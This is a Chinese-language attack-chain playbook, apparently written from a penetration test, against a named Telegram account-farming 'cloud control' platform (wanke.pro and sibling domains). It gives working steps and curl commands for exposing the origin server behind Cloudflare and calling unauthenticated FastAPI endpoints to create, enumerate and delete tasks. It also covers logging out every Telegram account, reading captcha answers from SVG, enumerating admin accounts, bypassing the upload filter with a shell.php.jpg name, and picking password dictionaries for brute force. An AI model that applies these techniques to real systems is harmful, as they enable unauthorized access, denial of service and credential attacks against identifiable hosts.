# TG 云控/真机养号平台 攻击链（万客云台 wanke.pro 实例）

配套 `web-api-auth-surface-audit`（R1-R8 是通则，本文是一个完整落地实例）。

**指纹**: 主站宣传页（CF 托管）→ 登录跳 `xxx.pro`；子域 `<saomiao|yanzheng|app|api>.<domain>`；
worker 服务名 `tg-python-core`（FastAPI/uvicorn，常在 8001）；PHP 前台 `api/index.php?action=<kebab-action>`；
中文标题含「云控 / 真机注册 / 协议号 / 直登号 / 云接码」；面板标题含「模拟云控台」「云控中心」。

## 0. 起手（5 分钟定位源站）

```
dig +short target.com          # CF? 看 NS / 是否 188.114.x / 104.21.x
crt.sh ?q=%25.target.com       # 子域
api.hackertarget.com/reverseiplookup/?q=<IP>   # 反查同 IP 全部域名（免费，比 crt.sh 稳）
```
宣传站只挂静态页，真业务在裸奔源站（无 CDN 的 .pro/.top 兄弟域）。

**源站 vhost 矩阵**（拿到 IP 后立刻做）：
```bash
curl -sk -H "Host: <每个已知域名>" https://<源站IP>/   # 逐个比对字节数 / md5
```
判据：**恒定字节数的 nginx 默认页**（本 case 1326B「没有找到站点」）= 该 vhost 未配置。
本 case `Host: wankeyuntai.com` 直连源站返回 200 + 与线上 CF 一致的页面（md5 相同）
→ **CF 的 WAF / 限速 / 隐藏源站全部失效**，且该 IP 同时承载宣传页 + 云控台 + USDT 商家系统 + 验证系统。

## 1. 最高价值：worker 的 8001 FastAPI（通常零鉴权）

```bash
curl http://IP:8001/openapi.json     # 服务名 tg-python-core，129 个操作 / 73KB
python3 -c "import json;d=json.load(open('openapi.json'));print(d['components'].get('securitySchemes'))"
# {} == 零鉴权定义，立刻验证写接口
curl -X POST http://IP:8001/clear-account/tasks -H 'Content-Type: application/json' -d '{"accounts":["/tmp/x.session"]}'
```

**关键判据（R1）**：`{"code":400,"message":"messages 不能为空"}` / `accounts 不能为空` /
`机器人 token 格式错误` = **处理器已执行、只缺参数** = 鉴权缺失。补参即得任务 ID。
实测未授权创建：clear-account / monitor-bot / export-members / add-friend / join-groups /
filter-phone / smart-group-chat。

- **`DELETE /{module}/tasks/{id}` 不校验任务类型**：用 monitor-bot 路径可删 smart-group-chat 等其它模块的任务 → 未授权 DoS。
- **`POST /account-profile/logout-all` 空 body 即返回 `{"ok":true}`** → 生产等于一键登出全平台 TG 账号。
- `/internal/*`、`/account_upload`、`/account_code_send|login` 有共享密钥（`401 内部鉴权失败`），其余 120+ 接口没有 —— 这反证鉴权是遗漏而非设计（R2 顺序：先 422 schema 再 401）。
- `/account_test` 吃**明文 JSON**，`path` 被当 Telethon session 路径：`[Errno 13] Permission denied: '<path>.json'`
  vs `session path not found` = **未授权文件系统存在/可写性 oracle**（实测 `/root /opt /etc /home /tmp /srv` 存在）。
- 生产务必清理 `/docs`、`/redoc`、`/openapi.json`。

**清理**：PoC / 矩阵扫描创建的任务必须 DELETE 掉并回读 404 验证。

### 1.7 全量鉴权矩阵（产出可直接进报告的表）

逐 operation 发最小 body，统计：`200 带数据` / `业务报错(无鉴权)` / `401` / `404` 四类计数。
本 case 129 操作 → 8 个返回 200、41 个业务报错（=无鉴权）、80 个 404、仅 6 个 401。
**这张表比任何叙述都有说服力**，也是「已穷尽」的唯一凭据。

### 1.8 任务 ID 零熵 → 盲枚举并删除他人任务（R3）

| 模块 | ID 形态 | 熵 |
|---|---|---|
| `smart-group-chat` | `1789378994010`（纯毫秒时间戳） | **0 bit** |
| `monitor-bot` | `monitor_20260914094407_b156c9` | 时间戳 + 6hex（~24 bit） |
| `clear-account` | `clear_account_20260914083211_b3e643` | 同上 |

PoC：造 3 个「受害者」任务 → 在创建时刻 ±3s 区间（7907 候选）25 线程盲枚举
`GET /smart-group-chat/tasks/{ts}/logs` → 3/3 命中 → 未授权 `DELETE` 全删 → 回读 404。**耗时 49 秒。**

## 2. 明文 SVG 验证码（本类平台通病，见即拿，R6）

```bash
curl -s 'https://site/api/index.php?action=captcha' | grep -oP '<text[^>]*>\K[^<]+'
```
三个系统（前台 tgyzc.com、`saomiao.<domain>`、`yanzheng.<domain>`）全部如此，答案以 `<text>` 明文写在 SVG 里。

**第二重失效**：`saomiao` 的 Flask session cookie 只签名不加密，base64 解开即
`{'captcha': '9SPJ', 'captcha_at': ..., 'csrf_token': ...}`。
验证码单次有效（复用即 `验证码错误`），爆破必须每次重取并保持会话绑定。

## 3. 前端 JS 挖 action 清单

```bash
grep -oE 'apiUrl\([^;]{0,200}' app.js | head -3      # 找 API 基址
grep -oE "request\(\s*['\"\`]([^'\"\`]+)" admin-app.js | sort -u   # /admin/ 常独立，JS 在 /admin/assets/
```
万客 case 管理 action：`update-user-role` / `reset-user-password` / `generate-recharge-cards` /
`export-recharge-cards` / `update-user-profile` / `admin-login`。
**服务端 403 拦得住**（`没有管理员权限`）—— 别只看前端就下结论，也别因为前端藏着这些就以为能打。

## 4. admin-login 的三个低成本漏洞

1. **账号枚举**：`密码错误`（账号存在）vs `账户不存在` → 本 case 确认 `admin`、`administrator` 存在。
2. **无锁定**：见 R5，连错 20+ 次无锁定，「5 次锁 15 分钟」是装饰。
3. **DB 错误回显**：`500 SQLSTATE[HY000]: General error: 1205 Lock wait timeout exceeded` 原样吐出
   → 暴露 MySQL + PHP 未设错误处理 + 登录对用户行**行级加锁**。自己开 5 线程就会把自己卡成 1205（R4）。

## 5. 上传点判据

白名单只看**末位后缀**：`shell.php` → `Only JPG and PNG are allowed`；`shell.php.jpg` → 通过校验进入处理
（是否可利用取决于上传目录解析配置）。

## 6. 加密信道（PHP 面板 ↔ worker）

`yanzheng.<domain>/api/login.php` 对任何输入返回每次不同的密文：`{"payload":"<base64>"}`（PUT/DELETE/OPTIONS 同样）：

```python
raw = base64.b64decode(payload)   # nonce(12) + ciphertext + tag(16)，与 worker SecureRequest 框架一致
```

- nonce 10/10 唯一 → 无重用攻击；密文长度恒定且与输入无关 → 固定明文消息；明文长度 = `len(raw)-28`
- **离线验密钥（R8）**：12 万候选 × 4-6 种派生 ≈ 50 万次 AES-GCM 校验、6,400 次/秒 → 0 命中 = 强随机，收手

## 7. 端点面测绘（跑干净才能说「打完了」）

- 根目录：`quickhits + common + raft-medium-files/directories` 再叠 `.php` 后缀变体（本 case ≈14 万请求）
- `/api/` 目录单独再跑同样词表（本 case 56,584 变体里**只有 `login.php` 一个**）
- **双 ignore 集合**：nginx 404（146B）与框架 404（548/771B）都要排除，否则噪音淹没命中
- vhost：英文 6000 词 + **中文拼音业务词**（saomiao/yanzheng/jiexi/chongzhi/qunfa… 英文表抓不到）

## 8. 堵点清单（每条都带判据，别重复试）

| 堵点 | 判据 |
|---|---|
| CF 120s Proxy Read Timeout | 这类平台 PHP 写操作 100+ 秒（注册 99s / 上传 / 建组），经 CF 必 524/502；要跑写操作必须先找回源站 IP |
| `api/app.<domain>` 静态保护 | 全路径 × 全方法 × 12 种 IP 伪造头统一返回 **138B「403 Forbidden」正文 + HTTP 200**；POST 得 405（静态服务器）→ 无绕过，记 deadend |
| 媒体读取接口 | `/private-message/media/file/{path}` 恒回「只能删除上传目录内的文件」（GET 走了 DELETE 校验分支）；20+ 穿越编码（`%2e%2e`/`..;/`/`....//`/`%c0%ae`/原始请求行）全挡 |
| nginx IP 白名单 | `X-Forwarded-For`/`X-Real-IP`/`CF-Connecting-IP` 一律无效；先查 AAAA 看能否走 IPv6（本 case 无 AAAA、本机无 v6） |
| Flask `SECRET_KEY` | 10 万常见字典未命中即换面 |
| 后台路径 | `index.php?page=*`、`/export.php`、`/logs`、`/orders` 全部 302 回登录 = 防护正常，唯一路是拿凭据 |
| 单会话强制 | 响应含 `current_session_token`，新登录踢旧 token → 脚本要能自动重登 |
| 会话伪造 | 伪造 `PHPSESSID` / `admin` / `role` cookie 全无效 |
| 字典选择 | 中文平台先用 `SecLists/Passwords/Common-Credentials/Language-Specific/Chinese-common-password-list-top-10000.txt`，再叠平台特征变体（域名/客服号/品牌拼音 × 年份/后缀） |
